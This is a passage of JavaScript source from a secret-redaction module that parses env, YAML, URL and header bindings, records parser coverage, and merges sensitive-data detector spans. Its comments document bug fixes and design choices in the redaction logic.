  while ((match = schemeRe.exec(text))) {
    const urlStart = match.index;
    // The URL runs to whitespace, a quote or a closing delimiter.
    let urlEnd = urlStart;
    while (urlEnd < text.length && !/[\s"'<>)\]}]/.test(text[urlEnd])) urlEnd++;
    const url = text.slice(urlStart, urlEnd);
    const q = url.indexOf("?");
    if (q < 0) continue;
    // A URL carrying a query string is an attempt, even when no parameter matches.
    if (coverage) coverage.record(PARSER.URL, COVERAGE_STATUS.PARSED, urlStart, urlEnd);
    const hash = url.indexOf("#", q);
    const query = url.slice(q + 1, hash < 0 ? undefined : hash);

    let at = q + 1;
    for (const part of query.split("&")) {
      const eq = part.indexOf("=");
      if (eq > 0) {
        const key = part.slice(0, eq);
        const rawValue = part.slice(eq + 1);
        let decodedKey = key;
        try { decodedKey = decodeURIComponent(key); } catch { /* keep raw */ }
        if (rawValue.length === 0 && SENSITIVE_QUERY_KEY_RE.test(decodedKey)) {
          // Recognised a sensitive name with no locatable value.
          if (coverage) coverage.record(PARSER.URL, COVERAGE_STATUS.PARTIAL, urlStart, urlEnd);
        }
        if (rawValue.length > 0 && SENSITIVE_QUERY_KEY_RE.test(decodedKey)) {
          const valueStart = urlStart + at + eq + 1;
          out.push({
            kind: "binding",
            key: decodedKey,
            normalizedKey: normalizeBindingKey(decodedKey),
            valueStart,
            valueEnd: valueStart + rawValue.length,
            syntax: "url-query",
            evidence: ["structured_binding", "sensitive_query_name", "raw_span_no_reencode"],
            strength: KEY_STRENGTH.STRONG,
            raw: rawValue,
            queryName: decodedKey,
          });
        }
      }
      at += part.length + 1; // + the `&`
    }
    schemeRe.lastIndex = urlEnd;
  }
  return out;
}

// ------------------------------------------------------ parser coverage --------
//
// Observability for the structured parsers, defined so the numbers mean something.
//
// NOT "how many bytes did we fail to parse": under that definition every sentence of
// ordinary prose is UNKNOWN and the ratio is noise. The unit is a parser ATTEMPT -- a
// construct the parser could recognise and was therefore obliged to locate.
//
//   PARSED          the structure was recognised and fully located
//   PARTIAL         a container/binding start was recognised but part is unmodelled
//                   (YAML path degraded, shell quoting not fully supported, ...)
//   FAILED          there was enough evidence to attempt, but the parser could not
//                   locate it safely -> counts toward unknown_bytes
//   NOT_APPLICABLE  does not look like this format at all (prose, prose, prose)
//                   -> does NOT count toward unknown_bytes
//
// No raw content is recorded. Regions are offsets only.

export const PARSER = Object.freeze({
  ENV: "env",
  SHELL: "shell",
  YAML: "yaml",
  HEADER: "header",
  URL: "url",
});

export const COVERAGE_STATUS = Object.freeze({
  PARSED: "PARSED",
  PARTIAL: "PARTIAL",
  FAILED: "FAILED",
  NOT_APPLICABLE: "NOT_APPLICABLE",
});

/** Merge overlapping/adjacent [start,end) intervals and return the covered byte count. */
export function unionBytes(regions) {
  const sorted = regions
    .filter((r) => r && r.end > r.start)
    .map((r) => [r.start, r.end])
    .sort((a, b) => a[0] - b[0] || a[1] - b[1]);
  let total = 0;
  let curStart = 0;
  let curEnd = 0;
  let open = false;
  for (const [start, end] of sorted) {
    if (!open) {
      curStart = start;
      curEnd = end;
      open = true;
    } else if (start > curEnd) {
      total += curEnd - curStart;
      curStart = start;
      curEnd = end;
    } else if (end > curEnd) {
      curEnd = end;
    }
  }
  if (open) total += curEnd - curStart;
  return total;
}

/** Collect per-attempt records for one payload. */
export class ParserCoverage {
  constructor() {
    this.attempts = [];
  }
  record(parser, status, regionStart, regionEnd, extra = {}) {
    if (status === COVERAGE_STATUS.NOT_APPLICABLE) return this;
    const start = Math.max(0, regionStart | 0);
    const end = Math.max(start, regionEnd | 0);
    this.attempts.push({
      parser,
      status,
      regionStart: start,
      regionEnd: end,
      bytes: end - start,
      ...(extra.jsonPath ? { jsonPath: extra.jsonPath } : {}),
    });
    return this;
  }
  /**
   * Request-level summary.
   *
   * `bytes` are unioned across parsers so two parsers looking at the same text cannot
   * double count. Per-parser counts stay per-parser, where summing is meaningful.
   */
  summary() {
    const of = (status) => this.attempts.filter((a) => a.status === status);
    const statuses = [COVERAGE_STATUS.PARSED, COVERAGE_STATUS.PARTIAL, COVERAGE_STATUS.FAILED];
    const byParser = {};
    for (const parser of Object.values(PARSER)) {
      const rows = this.attempts.filter((a) => a.parser === parser);
      if (!rows.length) continue;
      byParser[parser] = {
        attempted: rows.length,
        parsed: rows.filter((r) => r.status === COVERAGE_STATUS.PARSED).length,
        partial: rows.filter((r) => r.status === COVERAGE_STATUS.PARTIAL).length,
        failed: rows.filter((r) => r.status === COVERAGE_STATUS.FAILED).length,
        bytes: rows.reduce((n, r) => n + r.bytes, 0),
      };
    }
    // unionBytes works on {start,end}; coverage records use {regionStart,regionEnd}.
    // Passing the records straight through made the overflow filter compare undefined
    // against undefined, so every byte total came out zero.
    const toInterval = (r) => ({ start: r.regionStart, end: r.regionEnd });
    const main = (status) => ({
      attempted: of(status).length,
      bytes: unionBytes(of(status).map(toInterval)),
    });
    const located = of(COVERAGE_STATUS.PARSED).concat(of(COVERAGE_STATUS.PARTIAL));
    const parsed = main(COVERAGE_STATUS.PARSED);
    const partial = main(COVERAGE_STATUS.PARTIAL);
    const failed = main(COVERAGE_STATUS.FAILED);
    return {
      attempted_regions: this.attempts.length,
      parsed_regions: parsed.attempted,
      partial_regions: partial.attempted,
      failed_regions: failed.attempted,
      attempted_bytes: unionBytes(this.attempts.map(toInterval)),
      located_bytes: unionBytes(located.map(toInterval)),
      unknown_bytes: failed.bytes,
      byParser,
      attempts: this.attempts,
    };
  }
  /** Attach to a spans array without polluting its contents. */
  attachTo(spans) {
    Object.defineProperty(spans, "coverage", { value: this.summary(), enumerable: false });
    return spans;
  }
}

export const PATH_CONFIDENCE = Object.freeze({
  SIMPLE_MAPPING: "simple-mapping",
  UNKNOWN: "unknown",
});

// D2a: simple block-mapping YAML scalars only.
//
//   password: xxx
//   password: "xxx"
//   password: 'xxx'
//
// Deliberately NOT handled here: block scalars (`|`, `>`), sequences, flow style
// (`{...}`, `[...]`), anchors/aliases/tags, multi-document files, and non-scalar
// values. When any of those appear the structural hint degrades instead of
// guessing:
//
//   - a construct we do not model inside a block -> pathConfidence UNKNOWN and the
//     path is cleared,
//   - an entry we cannot interpret at all -> no binding record for that line.
//
// `pathSegments` is a HINT, not a fact, and must not be used as a schema path. In
// particular, D2c must NOT conclude "path === data.password therefore base64": the
// schema decision needs an object-level recognizer
// (apiVersion == v1 AND kind == Secret AND path under root `data`).
// YAML plain-scalar comment boundary.
//
// A `#` starts a comment only when it is preceded by separation whitespace;
// `abc#123` keeps its `#` as part of the value. Getting this wrong is not
// cosmetic: with the comment inside the span, redaction swallows the comment and
// rewrites the host document, and restoring byte-for-byte becomes impossible.
// Returns the value and the offset at which the value ends (comments and the
// whitespace that separates them are NOT part of the span).
export function splitPlainScalar(rest) {
  for (let i = 0; i < rest.length; i++) {
    if (rest[i] !== "#") continue;
    const prev = i > 0 ? rest[i - 1] : "";
    if (i === 0 || /[ \t]/.test(prev)) {
      let end = i;
      while (end > 0 && /[ \t]/.test(rest[end - 1])) end--;
      return { value: rest.slice(0, end), end };
    }
  }
  return { value: rest.replace(/\s+$/, ""), end: rest.replace(/\s+$/, "").length };
}

// Block scalar header: `|`, `>`, with optional chomping (`+`/`-`) and an explicit
// indentation indicator (`1`-`9`), in either order.
const BLOCK_SCALAR_HEADER_RE = /^([|>])(?:(\d)([+-]?)|([+-]?)(\d)?)([ \t]*(?:#.*)?)$/;

// D2b-2: locate the BODY span of a block scalar, following the YAML 9.1.1 rule --
// content indentation is set by the first non-empty line, and the block ends at the
// first non-empty line that is indented less.
//
// The span covers the body text only: the indicator line (`|`, `>-`, ...) and the
// leading indentation of each body line stay outside it, so a replacement can
// neither eat the indicator nor re-indent the document. That leaves the leading
// indentation of continuation lines in place, which keeps the replacement valid
// YAML for a single-line body and is the conservative choice for multi-line bodies.
export function findBlockScalarBody(lines, headerIndex, keyIndent) {
  const first = headerIndex + 1;
  const bodyIndent = (raw) => {
    const ws = raw.match(/^[ \t]*/)[0];
    const rest = raw.slice(ws.length);
    if (rest === "" || rest.startsWith("#")) return -1; // blank or comment-only
    return ws.length;
  };

  let contentIndent = -1;
  for (let i = first; i < lines.length; i++) {
    const ind = bodyIndent(lines[i]);
    if (ind === -1) continue;
    if (ind <= keyIndent) return null; // no body at all
    contentIndent = ind;
    break;
  }
  if (contentIndent === -1) return null;

  let last = -1;
  for (let i = first; i < lines.length; i++) {
    const ind = bodyIndent(lines[i]);
    if (ind === -1) continue;
    if (ind < contentIndent) break;
    last = i;
  }
  if (last < first) return null;
  return { firstContentLine: first, lastContentLine: last, contentIndent };
}

export function parseYamlBindings(text, coverage = null) {
  const out = [];
  if (typeof text !== "string" || !text) return out;
  const lines = text.split("\n");

  // Indentation stack: entries are { indent, key }. Only maintained while the
  // document looks like a simple block mapping.
  let stack = [];
  let docShapeKnown = true;

  // Absolute start offset of every line, computed once. The previous inline helper
  // did `lines.slice(0, idx).reduce((n, l) => n + l.length + 1, lineStart)`, which
  // added `lineStart` on top of the accumulated prefix -- the prefix already IS
  // `lineStart` at the current line -- so every span was shifted forward by the
  // length of all preceding lines.
  const lineOffsets = [];
  for (let i = 0, at = 0; i < lines.length; i++) { lineOffsets.push(at); at += lines[i].length + 1; }

  let lineStart = 0;
  for (let lineIndex = 0; lineIndex < lines.length; lineIndex++) {
    const line = lines[lineIndex];
    const stripped = line.trim();
    const indent = line.length - line.replace(/^[ \t]*/, "").length;

    // A document that is not a plain block mapping: stop tracking the path rather
    // than inventing parent keys.
    if (/^(---|\.\.\.)\s*$/.test(stripped) || /^(---|\.\.\.)\s/.test(stripped)) {
      docShapeKnown = false;
      stack = [];
      lineStart += line.length + 1;
      continue;
    }
    if (stripped === "" || stripped.startsWith("#")) { lineStart += line.length + 1; continue; }

    // Sequences, explicit keys, anchors/aliases and tags are not modelled. The PATH
    // is lost, but the line is still scanned: skipping it outright would stop
    // checking secrets inside a sequence item, which is fail-open. So the entry is
    // parsed below with pathConfidence UNKNOWN and pathSegments cleared.
    const unmodelled = /^\s*(-\s|\?\s|[&*!])/.test(line);
    if (unmodelled) { docShapeKnown = false; stack = []; }

    // Match against the line with trailing whitespace removed, but compute offsets
    // against `line`: using the trimmed length without its delta shifted every span
    // by one character, which silently ate the first character of the value.
    const trimmedEnd = line.replace(/\s+$/, "");
    // A sequence item may still carry a `key: value` pair (`- password: x`). Strip
    // the dash for matching only; the offset arithmetic below stays relative to the
    // original line.
    const matchTarget = trimmedEnd.replace(/^([ \t]*)-[ \t]+/, "$1");
    const m = /^([ \t]*)([^\s:#][^:#]*?)[ \t]*:[ \t]*([\s\S]*)$/.exec(matchTarget);
    // A mapping separator needs whitespace after the colon, or the line is not a block
    // mapping. Without this the SHELL assignment
    //
    //   DB_PASSWORD=$(op read op://vault/db/password)
    //
    // parsed as YAML with `op` as an inner key: the split landed on the `op:` of the URL,
    // producing key=DB_PASSWORD and a value of `//vault/db/password)`. A strong key then
    // made it a binding span, so a reference to a secret was redacted as if it were the
    // secret -- and only a fragment of the line was covered.
    //
    // The exception is an unquoted scalar, which may not begin with `/` or `$`: that is what
    // separates `token:ghp_xxx` (a real compact mapping) from a command substitution.
    if (m && !/:[ \t]/.test(m[0]) && /^[\/$]/.test(m[3])) {
      if (coverage) coverage.record(PARSER.YAML, COVERAGE_STATUS.NOT_APPLICABLE, lineStart, lineStart + line.length);
      lineStart += line.length + 1;
      continue;
    }
    if (!m) {
      // Attempted but unlocatable. The trigger has to be a SINGLE token followed by a
      // colon (allowing quotes): without that, every English sentence containing a
      // colon becomes a FAILED attempt and the metric drowns in prose.
      if (coverage && /^[ \t]*["']?[^\s:"']+["']?[ \t]*:/.test(line)) {
        coverage.record(PARSER.YAML, COVERAGE_STATUS.FAILED, lineStart, lineStart + line.length);
      }
      lineStart += line.length + 1;
      continue;
    }

    const rawKey = m[2].trim();
    const key = cleanBindingKey(rawKey);
    if (!key) { lineStart += line.length + 1; continue; }
    const rest = m[3];
    // Leading offset of `rest` inside `line`: everything the regex consumed before it.
    const restStart = lineStart + trimmedEnd.length - rest.length;

    // Maintain the indentation stack for the NEXT line's benefit, and compute this
    // key's ancestry.
    while (stack.length && stack[stack.length - 1].indent >= indent) stack.pop();

    const structural = {
      syntax: "yaml",
      indent,
      pathSegments: [],
      pathConfidence: PATH_CONFIDENCE.UNKNOWN,
    };
    if (docShapeKnown) {
      structural.pathSegments = [...stack.map((e) => e.key), key];
      structural.pathConfidence = PATH_CONFIDENCE.SIMPLE_MAPPING;
    }

    // ---- value ----
    if (rest === "") {
      // Empty value: record the key so descendants stay attributable, emit nothing.
      // It is still a located structure, so it counts as PARSED.
      if (coverage) coverage.record(PARSER.YAML, COVERAGE_STATUS.PARSED, lineStart, lineStart + line.length);
      stack.push({ indent, key });
      lineStart += line.length + 1;
      continue;
    }

    const blockMatch = BLOCK_SCALAR_HEADER_RE.exec(rest);
    if (blockMatch) {
      // YAML 9.1.1 allows chomping and the indentation indicator in either order:
      // `|2-`, `|-2`, `|2`, `|-`. The regex captures the digit in two possible
      // groups, so neither order is silently rejected.
      // D2b-2. The indicator line is not the value; the body is.
      const loc = findBlockScalarBody(lines, lineIndex, indent);
      if (loc) {
        const startOfLine = (idx) => lineOffsets[idx];
        const firstLineStart = startOfLine(loc.firstContentLine);
        const indentOfFirst = lines[loc.firstContentLine].match(/^[ \t]*/)[0].length;
        const lastLine = lines[loc.lastContentLine];
        const multiLine = loc.firstContentLine !== loc.lastContentLine;
        // A single-line body can be spanned directly. A multi-line body must NOT be
        // spanned as a whole: replacing lines with one unindented token violates the
        // block's indentation requirement and yields invalid YAML.
        // Region vs span, kept separate. The parser records WHERE the body is;
        // whether anything is redacted is decided by key strength or by a content
        // detector. Emitting every body line as a redaction span turned every
        // block scalar into a redaction surface: `notes: |`, `description: |` and
        // `script: |` are common in README/Helm/K8s and none of them are secret.
        const bodyIndent = lines[loc.firstContentLine].match(/^[ \t]*/)[0].length;
        const region = {
          firstLine: loc.firstContentLine,
          lastLine: loc.lastContentLine,
          indent: bodyIndent,
          start: lineOffsets[loc.firstContentLine] + bodyIndent,
          end: lineOffsets[loc.lastContentLine] + lines[loc.lastContentLine].replace(/[ \t]+$/, "").length,
        };

        if (coverage) {
          coverage.record(PARSER.YAML, COVERAGE_STATUS.PARSED, lineOffsets[loc.firstContentLine], region.end);
        }
        const strength = classifyKeyStrength(key);
        // Only a STRONG parent key promotes the body to redaction spans. A weak or
        // absent key leaves the decision to the content detectors, so an ordinary
        // documentation block is untouched while a real key under `notes: |` is
        // still caught by the provider rule.
        if (strength === KEY_STRENGTH.STRONG) {
          for (let i = loc.firstContentLine; i <= loc.lastContentLine; i++) {
            const lineText = lines[i];
            const lineIndent = lineText.match(/^[ \t]*/)[0].length;
            const lineBody = lineText.slice(lineIndent).replace(/[ \t]+$/, "");
            if (lineBody.length === 0) continue;
            // A reference is not a literal secret even inside a block body.
            // Without this, `password: |\n  ${{ secrets.X }}` was replaced with a
            // token, destroying the indirection the template exists to provide.
            if (looksLikeReferenceValue(lineBody)) continue;
            out.push({
              kind: "binding",
              key,
              normalizedKey: normalizeBindingKey(key),
              valueStart: lineOffsets[i] + lineIndent,
              valueEnd: lineOffsets[i] + lineIndent + lineBody.length,
              syntax: "yaml",
              evidence: ["block_scalar_body", "strong_secret_key"],
              strength,
              raw: lineBody,
              indent: structural.indent,
              pathSegments: structural.pathSegments,
              pathConfidence: structural.pathConfidence,
              bodyCandidate: true,
              bodyRegion: region,
            });
          }
        } else {
          // Region only: no redaction span, but the structure is available as
          // evidence (and to a future object-level recogniser).
          out.push({
            kind: "binding",
            key,
            normalizedKey: normalizeBindingKey(key),
            valueStart: region.start,
            valueEnd: region.end,
            syntax: "yaml",
            evidence: ["block_scalar_region"],
            strength,
            raw: text.slice(region.start, region.end),
            indent: structural.indent,
            pathSegments: structural.pathSegments,
            pathConfidence: structural.pathConfidence,
            bodyRegion: region,
            regionOnly: true,
          });
        }
      }

      stack.push({ indent, key });
      lineStart += line.length + 1;
      continue;
    }

    let valueStart = -1;
    let valueEnd = -1;
    let raw = "";
    let quoted = false;
    const dq = /^"((?:\\.|[^"\\])*)"/.exec(rest);
    const sq = /^'((?:''|[^'])*)'/.exec(rest);
    if (dq) { quoted = true; valueStart = restStart + 1; raw = dq[1]; valueEnd = valueStart + raw.length; }
    else if (sq) { quoted = true; valueStart = restStart + 1; raw = sq[1]; valueEnd = valueStart + raw.length; }
    else if (rest.startsWith("{") || rest.startsWith("[")) {
      // Flow collection: not a scalar. Trailing comments after a flow collection are
      // also not modelled, so the key is not pushed.
      lineStart += line.length + 1;
      continue;
    } else {
      // Plain scalar: ends at a separation-whitespace `#`, which starts a comment.
      // The comment and the whitespace before it stay outside the span, so a
      // redaction cannot delete them.
      const split = splitPlainScalar(rest);
      raw = split.value;
      valueStart = restStart;
      valueEnd = restStart + split.end;
    }
    if (raw.length === 0) { stack.push({ indent, key }); lineStart += line.length + 1; continue; }

    const strength = classifyKeyStrength(key);
    const evidence = ["structured_binding"];
    if (strength === KEY_STRENGTH.STRONG) evidence.push("strong_secret_key");
    if (quoted) evidence.push("quoted_value");
    if (looksLikeReferenceValue(raw)) evidence.push("reference_value");
    if (structural.pathConfidence === PATH_CONFIDENCE.UNKNOWN) evidence.push("path_unknown");

    if (coverage) {
      coverage.record(
        PARSER.YAML,
        structural.pathConfidence === PATH_CONFIDENCE.SIMPLE_MAPPING
          ? COVERAGE_STATUS.PARSED
          : COVERAGE_STATUS.PARTIAL,
        lineStart,
        lineStart + line.length
      );
    }
    out.push({
      kind: "binding",
      key,
      normalizedKey: normalizeBindingKey(key),
      valueStart,
      valueEnd,
      syntax: "yaml",
      evidence,
      strength,
      raw,
      indent: structural.indent,
      pathSegments: structural.pathSegments,
      pathConfidence: structural.pathConfidence,
    });

    stack.push({ indent, key });
    lineStart += line.length + 1;
  }
  return out;
}

/**
 * Produce `binding` records: { kind, key, normalizedKey, valueStart, valueEnd,
 * syntax, evidence }. Raw value span only -- quotes are excluded from the span but
 * left in the text.
 */
export function parseBindings(text, coverage = null) {
  const out = [];
  if (typeof text !== "string" || !text) return out;
  const lines = text.split("\n");

  let lineStart = 0;
  for (const line of lines) {
    const add = (record) => out.push(record);

    // Skip shell/YAML comment lines: `# PASSWORD=x` is documentation, not config.
    if (!/^\s*#/.test(line)) {
      // Shell keyword form: `export KEY=value`, with optional spaces around `=`.
      const exportMatch = /^\s*export\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*/.exec(line);
      // Plain assignment. The name must be anchored at line start (after optional
      // whitespace) so that `kubectl logs --x` or prose containing `=` is not a
      // binding.
      const plainMatch = exportMatch ? null : /^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*/.exec(line);

      const m = exportMatch || plainMatch;
      if (m) {
        const key = m[1];
        const nameStart = lineStart + m.index + m[0].length;
        const syntax = exportMatch ? "shell" : "env";
        const rest = line.slice(m[0].length);

        // Value span: quoted interior when quoted, otherwise the token run. This
        // never includes surrounding whitespace, which would otherwise be
        // swallowed by a replacement.
        let valueStart = -1;
        let valueEnd = -1;
        let raw = "";
        const quoted = /^(["'])((?:\\.|(?!\1).)*)\1/.exec(rest);
        if (quoted) {
          valueStart = nameStart + 1;
          valueEnd = valueStart + quoted[2].length;
          raw = quoted[2];
        } else {
          // A bare value runs to the end of the line, or to an unquoted `#`.
          // Stopping at the first space truncated `correct horse battery staple` to
          // `correct`, so the rest of the password stayed in the clear.
          const bare = /^([^#]*?)\s*$/.exec(rest);
          if (bare && bare[1].length > 0) {
            // An unterminated quote (a truncated log line, or a stream delta cut
            // mid-value) must not have the quote swallowed into the value: the
            // delimiter belongs to the host syntax, not to the secret.
            const offset = /^["']/.test(bare[1]) ? 1 : 0;
            valueStart = nameStart + offset;
            valueEnd = nameStart + bare[1].length;
            raw = bare[1].slice(offset);
          }
        }
        if (valueStart < 0 || raw.length === 0) {
          // Assignment recognised, value not locatable.
          if (coverage) {
            coverage.record(exportMatch ? PARSER.SHELL : PARSER.ENV, COVERAGE_STATUS.FAILED, lineStart, lineStart + line.length);
          }
        }
        if (valueStart >= 0 && raw.length > 0) {
          if (coverage) {
            coverage.record(exportMatch ? PARSER.SHELL : PARSER.ENV, COVERAGE_STATUS.PARSED, lineStart, lineStart + line.length);
          }
          const strength = classifyKeyStrength(key);
          const evidence = ["structured_binding"];
          if (strength === KEY_STRENGTH.STRONG) evidence.push("strong_secret_key");
          if (quoted) evidence.push("quoted_value");
          if (looksLikeReferenceValue(raw)) evidence.push("reference_value");
          add({
            kind: "binding",
            key,
            normalizedKey: normalizeBindingKey(key),
            valueStart,
            valueEnd,
            syntax,
            evidence,
            strength,
            raw,
          });
        }
      }
    }
    lineStart += line.length + 1;
  }
  return out;
}

/**
 * Binding records that are safe to treat as secret evidence: strong key, and a
 * value that is not a reference to another value.
 */
export function bindingSpansOf(text, kind = "binding", parser = parseBindings, coverage = null) {
  return parser(text, coverage)
    // `regionOnly` records are structural evidence and deliberately NOT spans: the
    // parser must not decide that an ordinary `notes: |` block is sensitive.
    .filter((b) => !b.regionOnly)
    .filter((b) => b.bodyCandidate === true
      || (b.strength === KEY_STRENGTH.STRONG && !b.evidence.includes("reference_value")))
    // NOTE: no shape-based exclusion here. An earlier revision skipped any value that
    // merely LOOKED like this layer's token, which reintroduced the bypass the design
    // removed: `DB_PASSWORD=CRG_AAAA_AAAA` is a perfectly plausible low-entropy
    // password, and it was forwarded in the clear because the binding candidate never
    // reached the merge and no other detector fired. Protection eligibility comes from
    // OWNERSHIP at merge time (see RedactionContext.isProtectedToken), never from the
    // shape of the value.
    .map((b) => ({
      start: b.valueStart,
      end: b.valueEnd,
      type: b.bodyCandidate ? "block_scalar" : kind,
      priority: b.bodyCandidate ? 55 : 60,
      key: b.key,
      normalizedKey: b.normalizedKey,
      syntax: b.syntax,
      evidence: b.evidence,
      // Carried through for the entity classifier: without it, a strong binding loses
      // its strength in transit and every `DB_PASSWORD=...` classifies as UNKNOWN.
      strength: b.strength,
      ...(b.headerName ? { headerName: b.headerName } : {}),
      ...(b.pathSegments ? { pathSegments: b.pathSegments, pathConfidence: b.pathConfidence, indent: b.indent } : {}),
    }));
}

export function findSensitiveSpans(text, flags, deps = {}) {
  // `flags` is detector policy (which detectors run). `deps` is injected runtime
  // state, currently the ownership predicate for already-redacted tokens. Keeping
  // them separate matters: eligibility is ownership, not syntax, and mixing it
  // into flags would suggest it is a policy knob rather than request state.
  // Protected-span eligibility comes ONLY from an explicit registry supplied by
  // the caller (RedactionContext.protectedTokenPatterns: the tokens this request
  // minted, plus any explicitly registered foreign namespace). There is
  // deliberately no shape-based fallback: treating anything that merely looks
  // like a token as protected would let anyone smuggle a secret past detection by
  // wrapping it in a CRG-looking label. A caller that passes no registry
  // therefore protects nothing.
  const protectedSpans = [];
  for (const re of flags.protectedTokenPatterns || []) {
    protectedSpans.push(...collectRegexSpans(text, re, "existing", 1000));
  }
  // Predicate form: eligibility can also be answered per candidate, which is what
  // the request-local mapping actually provides. This matters when a token is
  // minted *during* the current pass: a static
  // registry snapshot would not know about it yet, and the fresh token would be
  // re-detected and nested.
  const isProtectedValue = typeof deps.isProtectedToken === "function" ? deps.isProtectedToken : null;

  const c = [];
  if (flags.secret) c.push(...collectRegexSpans(text, /\bsk-[A-Za-z0-9]{60,}\b/g, "secret", 110));
  if (flags.email) c.push(...collectRegexSpans(text, /[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+@[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?)+/g, "email", 90));
  if (flags.identity) c.push(...collectRegexSpans(text, /(?<!\d)\d{17}[0-9Xx](?!\d)/g, "identity", 100, (s) => chinaIdValid(s)));
  if (flags.bank) {
    const bankValid = (s) => { const d=s.replace(/\D/g,""); return d.length>=13 && d.length<=19 && luhnValid(d); };
    c.push(...collectRegexSpans(text, /(?<!\d)\d{13,19}(?!\d)/g, "bank", 85, bankValid));
    c.push(...collectRegexSpans(text, /(?<!\d)\d{4}(?:[ -]\d{4}){2,3}(?:[ -]\d{1,3})?(?!\d)/g, "bank", 85, bankValid));
  }
  if (flags.phone) {
    c.push(...collectRegexSpans(text, /(?<!\d)1[3-9]\d{9}(?!\d)/g, "phone", 88));
    c.push(...collectRegexSpans(text, /(?<!\d)\+(?:\d[ .()\-]?){7,14}\d(?!\d)/g, "phone", 88));
  }
  if (flags.gitleaks) c.push(...collectGitleakSpans(text));
  if (flags.highEntropy) for (const b of tokenizeBlocks(text)) if (isHighEntropyBlock(b.value)) c.push({ start:b.start, end:b.end, type:"entropy", priority:10 });
  // D1 structured context. This is an ADDITIVE detector: it contributes spans to
  // the same merge as everything else and never suppresses G/H or returns early.
  // A parse failure simply contributes nothing, leaving the other detectors to
  // cover the text -- the parser is evidence, not a security boundary.
  // Parser coverage is observability, not a gate: nothing here blocks on a high
  // UNKNOWN ratio. A baseline has to be measured on a real corpus before any threshold
  // is worth discussing. The object is only created when the caller asked for it, and
  // when present it is attached to the returned array as a non-enumerable property.
  const coverage = deps.coverage || null;
  if (flags.structuredContext !== false) {
    c.push(...bindingSpansOf(text, "binding", parseBindings, coverage));
    c.push(...bindingSpansOf(text, "binding", parseYamlBindings, coverage));
    c.push(...bindingSpansOf(text, "binding", parseHeaderBindings, coverage));
    c.push(...bindingSpansOf(text, "binding", parseUrlBindings, coverage));
  }
  // Registered foreign tokens are contributed as candidates so that the SAME
  // ownership filter that protects owned tokens also protects them. Exact
  // registrations are found by substring; prefix namespaces by their matcher.
  if (deps.foreignRegistry) {
    for (const ns of deps.foreignRegistry.namespaces) {
      ns.matcher.lastIndex = 0;
      for (const found of text.match(ns.matcher) || []) {
        const at = text.indexOf(found);
        if (at < 0) continue;
        c.push({ start: at, end: at + found.length, type: "foreign_token", priority: 70 });
      }
    }
    for (const token of deps.foreignRegistry.tokens) {
      let at = text.indexOf(token);
      while (at >= 0) {
        c.push({ start: at, end: at + token.length, type: "foreign_token", priority: 70 });
        at = text.indexOf(token, at + token.length);
      }
    }
  }

  const candidates = c.filter((x) => {
    if (protectedSpans.some((p) => overlaps(x, p))) return false;
    if (isProtectedValue && isProtectedValue(text.slice(x.start, x.end))) return false;
    return true;
  });

  // Identical-bounds consolidation, done BEFORE containment.
  //
  // A provider rule and a structured binding frequently produce the SAME bounds for
  // the same secret (`data.password: <base64>` matches the generic rule and the
  // binding span alike). The containment pass skips equal bounds on purpose, so
  // without this step one of the two is simply dropped -- and if the dropped one was
  // the binding, its path/structural hints vanish, which silently disables the
  // object-level recogniser that needs them.
  const byBounds = new Map();
  for (const candidate of candidates) {
    const key = `${candidate.start}:${candidate.end}`;
    const existing = byBounds.get(key);
    if (!existing) { byBounds.set(key, candidate); continue; }
    // Structural hints are taken from whichever side has them; ATTRIBUTION is taken
    // from the higher-priority side, so a provider rule keeps naming the secret
    // (`type: gitleaks`, `providerType: binding`) while the binding still supplies the
    // path. Picking one side wholesale loses one or the other.
    const richer = (existing.pathSegments?.length || 0) >= (candidate.pathSegments?.length || 0)
      ? existing : candidate;
    const other = richer === existing ? candidate : existing;
    const attributed = (existing.priority ?? 0) >= (candidate.priority ?? 0) ? existing : candidate;
    // A DIFFERENT-type hit at the SAME bounds is not a duplicate: it is a second opinion.
    // It must not be silently dropped either, because it is what tells the policy layer
    // whether hard secret evidence coexists with an infra shape. It is marked shadowed
    // instead, and the decision belongs to the policy -- dropping it here was how a
    // provider rule could lose to an entropy hit.
    const shadowed = attributed.type !== other.type ? other.type : null;
    byBounds.set(key, {
      ...richer,
      evidence: [...new Set([...(existing.evidence || []), ...(candidate.evidence || [])])],
      priority: Math.max(existing.priority ?? 0, candidate.priority ?? 0),
      type: attributed.type,
      ...(attributed.type !== richer.type ? { providerType: richer.type } : {}),
      ...(shadowed ? { shadowed } : {}),
    });
  }
  const consolidated = [...byBounds.values()];

  // Containment-aware merge.
  //
  // The previous priority-then-drop rule had a redaction-bounds hole:
  //
  //   DB_PASSWORD="prefix <PAT> suffix"
  //                └──── binding span (the whole value) ────┘
  //                        └── narrower provider hit ──┘
  //
  // Priority picked the narrow hit, and the enclosing binding span was then
  // discarded for overlapping it. Only the PAT was masked and the rest of the
  // password stayed in the clear.
  //
  // Now an enclosing span absorbs the hits inside it and inherits their evidence,
  // so the redaction covers the full value while the provider/type attribution
  // survives on the surviving span.
  // Widest first, then priority. Sorting by priority first made a WIDER span absorb a
  // NARROWER one and then hand the type to whichever inner hit had the higher priority,
  // so `[12,52) gitleaks` absorbed `[16,52) entropy` and came out labelled `entropy`.
  // Width ordering is what containment needs; priority only breaks ties.
  const byPriority = consolidated.slice().sort((a, b) =>
    (b.end - b.start) - (a.end - a.start) || b.priority - a.priority || a.start - b.start);
  const absorbed = new Set();
  const merged = [];
  for (const span of byPriority) {
    const inner = byPriority.filter((other) => other !== span
      && !absorbed.has(other)
      && other.start >= span.start && other.end <= span.end
      && !(other.start === span.start && other.end === span.end));
    if (!inner.length) { merged.push(span); continue; }

    // Attribution belongs to the most specific hit inside the span, so a provider
    // rule (`gitleaks`) keeps naming the secret even when a wider binding decides
    // the redaction bounds. Ties break toward the higher priority, then the
    // narrower span.
    const ranked = inner.slice().sort((a, b) =>
      b.priority - a.priority || (a.end - a.start) - (b.end - b.start));
    // Attribution rule. The OUTER span keeps its own identity when it is a provider
    // rule; it only hands attribution to an inner hit when the outer span is NOT a
    // provider hit and the inner one is. The previous rule ("highest priority inner
    // wins") let a wider `gitleaks` span absorb a narrower `entropy` hit and then
    // relabel ITSELF as entropy -- a weaker detector erasing a stronger one.
